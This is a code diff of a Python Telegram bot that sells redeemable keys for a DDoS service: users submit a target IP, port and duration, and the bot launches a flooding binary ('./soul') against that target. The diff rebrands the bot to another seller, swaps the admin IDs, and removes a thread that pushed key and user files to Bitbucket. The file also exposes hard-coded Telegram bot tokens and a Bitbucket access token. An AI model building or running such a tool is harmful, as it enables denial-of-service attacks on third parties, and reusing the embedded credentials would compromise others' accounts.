@@ -11,10 +11,10 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.new_event_loop()
 
-TOKEN = "7468995817:AAGhTy-PHgYhR50IJNCVmvi78qMtgPUCBjk"
-FORWARD_CHANNEL_ID = -1002156421934
-CHANNEL_ID = -1002156421934
-error_channel_id = -1002156421934
+TOKEN = "7181284778:AAHx4HGGlun1oqoCI0zVWNRhxSlRdqY6lVE"
+FORWARD_CHANNEL_ID = -1002232097214
+CHANNEL_ID = -1002232097214
+error_channel_id = -1002232097214
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -71,7 +71,7 @@ def save_users(users):
 
 
 def is_admin(user_id):
-    admin_ids = [1600832237, 1342302666]
+    admin_ids = [6171003108]
     return user_id in admin_ids
 
 
@@ -128,13 +128,13 @@ def redeem_key(user_id, key):
 
                 for user_data in users.values():
                     if user_data.get('redeemed_key') == key:
-                        return "This key has already been redeemed. Buy a new key from @SOULCRACKS."
+                        return "This key has already been redeemed. Buy a new key from @SamZGamerz."
 
                 if not has_access(user_id):
                     users[str(user_id)] = {'redeemed_key': key, 'has_access': True}
                     save_users(users)
 
-                    bot.send_message(user_id, "Buy a New code From @SOULCRACKS")
+                    bot.send_message(user_id, "Buy a New code From @SamZGamerz")
 
                 return "Key redeemed successfully! You can now use the /attack command."
 
@@ -259,7 +259,7 @@ def handle_attack_command(message):
         if not has_access(user_id):
             bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                        "*You need to be approved to use this bot.*\n"
-                                       "*Contact the owner for assistance: @SOULCRACKS.*", parse_mode='Markdown')
+                                       "*Contact the owner for assistance: @SamZGamerz.*", parse_mode='Markdown')
             return
 
         if bot.attack_in_progress:
@@ -305,7 +305,7 @@ def process_attack_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration):
     attack_process = asyncio.create_subprocess_shell(
-        f"./ipx {target_ip} {target_port} {duration}"
+        f"./soul {target_ip} {target_port} {duration} 900"
     )
     pkill_process = asyncio.create_subprocess_shell("pkill screen")
 
@@ -350,8 +350,8 @@ def handle_start(message):
         profile_photo = None
     
     welcome_message = f"""
-    Welcome To SoulCracks Ddos 
-    Join @SOULCRACKS
+    Welcome To SamZGamerz Ddos 
+    Join @SamZGamerz
     
     Your Information Here:
     Name: {full_name}
@@ -371,45 +371,11 @@ def handle_start(message):
         bot.reply_to(message, welcome_message)
 
 
-def save_and_push_files():
-    while True:
-        try:
-            print("Saving files...")
-            os.system("cp keys.txt keys.txt")
-            os.system("cp users.txt users.txt")
-            
-            os.system("git config --global user.name 'fxbxbsdfdh'")
-            os.system("git config --global user.email 'fxbxbsdfdh@example.com'")
-            
-            os.system("git add keys.txt users.txt")
-            os.system("git commit -m 'Update keys.txt and users.txt'")
-            
-            # Replace the token URL with your actual repository details
-            os.system("git push https://x-token-auth:ATCTT3xFfGN0FVa2Dmq5IwkT4R3lk7Pj00W4zX2dzCf-R0SPLz6b67qPXfF5IYjjDAz0tvGtyUERcWX80EVStjbi8AWCpJAZig87Dq1OBkW-7oNgK61zPeD6KgOjh31z7BvnY_KTHcQs9fM2g8Xx4UpABJigPZZlviHTnW4Zz_EcvOx3FskO8PQ=A34CC8F1@bitbucket.org/ssdgrdegr/gegtr.git")
-            
-            print("Files pushed to Git successfully.")
-        except Exception as e:
-            print(f"Error while saving files or pushing to Git: {e}")
-
-        time.sleep(3499)
-
-file_saving_thread = Thread(target=save_and_push_files, daemon=True)
-file_saving_thread.start()
 def start_asyncio_thread():
     asyncio.set_event_loop(loop)
     loop.run_forever()
 
 
 if __name__ == '__main__':
-
-    file_saving_thread = Thread(target=save_and_push_files, daemon=True)
-    file_saving_thread.start()
-
     Thread(target=start_asyncio_thread).start()
-
     bot.infinity_polling()
-
-    time.sleep(3600)
-    print("1 hour passed. Shutting down the script.")
-    os._exit(0)
-
